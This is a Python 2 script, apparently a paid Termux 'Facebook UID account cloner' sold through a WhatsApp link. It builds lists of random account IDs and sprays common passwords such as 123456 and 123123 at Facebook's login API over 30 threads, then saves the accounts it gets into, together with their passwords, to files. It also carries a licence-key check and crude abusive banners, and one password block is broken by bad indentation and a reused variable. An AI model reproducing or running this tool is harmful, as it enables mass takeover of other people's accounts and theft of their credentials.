#!/usr/bin/python 
# -*- coding: utf-8
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, uuid, requests, base64
logo = '\x1b\33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m\n \033[0m================================================================\n\33[93mAUTHOR :\033[91m[MAHDI HASAN] SHUVO\n\033[0;33mGITHUB : \033[1;97mhttps://github.com/MAHDI-Shuvo\nLIVE in Sylhet (Read in class 10)\n\033[42mNo NEED GF \033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU\n ================================================================ '
logo1 = """
\033[0;33m55.88b  d88.  .d8b.  db   db d8888b.d888888b\n88'YbdP`88 d8' `8b 88   88 88  `8D   `88'\n88  88  88 88ooo88 88ooo88 88   88    88\n88  88  88 88~~~88 88~~~88 88   88    88\n88  88  88 88   88 88   88 88  .8D   .88.\nYP  YP  YP YP   YP YP   YP Y8888D' Y888888P                                             
\033[0m================================================================
CREATED BY MAHDI HASAN(SHUVO)
FB ; https://web.facebook.com/mahdihasan.80
FB Grup ;https://web.facebook.com/group/
"""
os.system('clear')

print 48 * '\x1b[1;91m~'
def tik():
    titik = ['   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Wait A Few Moments \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(0.5)

fuck = []

def jenw():
    os.system('rm -rf .txt')
    os.system('clear')
    print logo1
    print 48 * '\x1b[1;91m~'
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Set Phone Number Amount You Want To Clone\n\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Example:1000,2000,10000,20000\n'
    walid = input('\x1b[1;92m     Enter Amount\x1b[1;93m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
    tik()
    for n in range(walid):
        nmbr = random.randint(1111111, 9999999)
        sys.stdout = open('.txt', 'a')
        print nmbr
        sys.stdout.flush()

import uuid
def bnsbuy():
    os.system('clear')
    print logo1
    print ''
    print '\x1b[1;92;1m Note: If Approval In Loading Or Show \nNo Internet Connection,Then Connect USA Proxy '
    print ''
    time.sleep(1)
    try:
        to = open('/data/data/com.termux/files/usr/etc/termuxopps', 'r').read()
        bns = base64.b64decode(to)
    except (KeyError, IOError):
        bnsreg()
    try:
        l = 'https://raw.githubusercontent.com/MAHDI-Shuvo/new/main/mahdi.text'        
        r = requests.get(l).text
    except requests.exceptions.ConnectionError:
        print "\x1b[0;31mNo Internet Connection"
        exit()

    if bns in r:
        fuck.append(1)
        main1()
    else:
        os.system('clear')
        print logo1
        print ' \x1b[1;96m\tYour Id Is Not Approved '
        print
        print '\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Do Not Press Enter If You Are A Free User\x1b[0m'
        print
        print '\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Your Key : \x1b[101m' + bns + '\x1b[0m'
        print
        raw_input('\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Press Enter To Buy This Tools ')
        os.system('am start https://wa.me/+8801887408882?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20Niki%20Paid%20Tools.%20My%20Key:%20' + bns)
        bnsbuy()


def bnsreg():
    os.system('clear')
    print logo1
    print '\t\x1b[1;96m Key Not Approved \x1b[0m'
    print
    print '\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Note : This Tools Is Paid,So Pay First'
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~MAHDI=="
    print
    print '\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Your Key: \x1b[92m\x1b[101m' + id + '\x1b[0m'
    print 
    ben = base64.b64encode(id)
    raw_input('\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Press Enter To Buy This Tools')
    os.system('am start https://wa.me/+8801887408882?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20Niki%20Paid%20Tools.%20My%20Key:%20' + id)
    sav = open('/data/data/com.termux/files/usr/etc/termuxopps', 'w')
    sav.write(ben)
    sav.close()
    os.system("clear")
    time.sleep(3)
    print logo1
    jalan("\x1b[1;92mSent Your Key :\x1b[1;92m \x1b[1;92m" + id + "\x1b[1;92m \n\x1b[1;92mTo Admin And Buy This Tools First \n \x1b[1;92mThen Run This Tools With \x1b[1;93m python2 mahdi.py ")
    exit()
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]')]
br.addheaders = [('User-Agent', 'Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011;]')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]')]

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print
print logo1
print 47 * '\x1b[1;91m-'
def lisensi():
    os.system('clear')
    main1()

def main1():
    if 1 in fuck:
        os.system('#')
    else:
        os.system("clear")
        print "\x1b[1;91mFuck Your Bypass System 🖕🖕🖕- Security By BNS Team"
        exit()
    os.system('clear')
    print logo
    print 47 * '\x1b[1;91m-'
    print '\x1b[1;91m [\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Start Cracking'
    time.sleep(0.05)
    print '\x1b[1;91m [\x1b[1;92m0\x1b[1;91m]\x1b[1;92m Back'
    pilih_login()

def pilih_login():
    if 1 in fuck:
        os.system('#')
    else:
        os.system("clear")
        print "\x1b[1;91mFuck Your Bypass System 🖕🖕🖕- Security By BNS Team"
        exit()
    peak = raw_input("\n\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m CHOOSE : \x1b[1;92m")
    if peak =="":
        print "\x1b[1;92mFill In Correctly"
        pilih_login()
    elif peak in ["1", "01"]:
        Zeek()
def Zeek():
    os.system('clear')
    print logo
    print 47 * '\x1b[1;92m-'
    print '\x1b[1;91m [\x1b[1;92m1\x1b[1;91m]\x1b[1;92m START CRACK OLD \x1b[1;91m[\x1b[1;93m2009\x1b[1;91m]'
    time.sleep(0.10)
    print '\x1b[1;91m [\x1b[1;92m0\x1b[1;91m]\x1b[1;92m Back'
    time.sleep(0.10)
    action()

def action():
    if 1 in fuck:
        os.system('#')
    else:
        os.system("clear")
        print "\x1b[1;91mFuck Your Bypass System 🖕🖕🖕- Security By BNS Team"
        exit()
    if 1 in fuck:
        os.system('#')
    else:
        os.system("clear")
        print "\x1b[1;91mFuck Your Bypass System 🖕🖕🖕- Security By BNS Team"
        exit()
    peak = raw_input('\n\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m CHOOSE : \x1b[1;92m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system('clear')
        print logo
        print 47 * '\x1b[1;91m-'
        print '\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m FACEBOOK UID ACCOUNT CLONER'
        print '\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;96m TYPE 2 DIGIT UID CODE'
        print '\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m 00,01,02,03,04,05,06,07,08,09,10'
        print '\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;93m 11,11,12,13,14,15,16,17,18,19,20'
        try:
            c = raw_input('\n\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m CHOOSE : \x1b[1;92m')
            k = '100000'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            main1()

    elif peak == '0':
        main1()
    else:
        print '[!] Fill In Correctly'
        action()
    print 48 * '\x1b[1;91m-'
    xxx = str(len(id))
    jalan("\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m TOTAL IDs NUMBER     : " + xxx)
    time.sleep(0.5)
    jalan("\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m YOUR UID CHOOSE CODE : " + c)
    time.sleep(0.5)
    jalan("\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m START UID ACCOUNT CRACKING...")
    time.sleep(0.5)
    jalan("\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m TO STOP THIS PROCESS PRESS CTRL THEN z")
    time.sleep(0.5)
    print 47 * '\x1b[1;91m-'    
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = '123456'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m [MAHDI-OK] ' + k + c + user + '  |  ' + pass1
                okb = open('save/nikiok.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m [MAHDI-CP] ' + k + c + user + '  |  ' + pass1
                cps = open('save/nikicp.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1234567'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m [MAHDI-OK] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/nikiok.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m [MAHDI-CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/nikicp.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '123456789'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m [MAHDI-OK] ' + k + c + user + '  |  ' + pass3
                        okb = open('save/nikiok.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m [MAHDI-CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/nikicp.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
			
			
			 pass4 = '123123'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m [MAHDI-OK] ' + k + c + user + '  |  ' + pass4
                        okb = open('save/nikiok.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m [MAHDI-CP] ' + k + c + user + '  |  ' + pass4
                        cps = open('save/nikicp.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
			
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * ("\x1b[1;91m-")
    print("\x1b[1;91m [\x1b[1;92m√\x1b[1;91m]\x1b[1;92m Process Has Been Complete")
    print("\x1b[1;91m [\x1b[1;92m√\x1b[1;91m]\x1b[1;92m Total OK >\x1b[1;92m " + str(len(oks)))
    print("\x1b[1;91m [\x1b[1;92m√\x1b[1;91m]\x1b[1;92m Total CP >\x1b[1;91m " + str(len(cps)))
    print("\x1b[1;91m [\x1b[1;92m√\x1b[1;91m]\x1b[1;92m Thanks For Using My Tools")
    print 47 * ("\x1b[1;91m-")
    raw_input("\n\x1b[1;93m Press Enter To Back")
    main1()


bnsbuy()
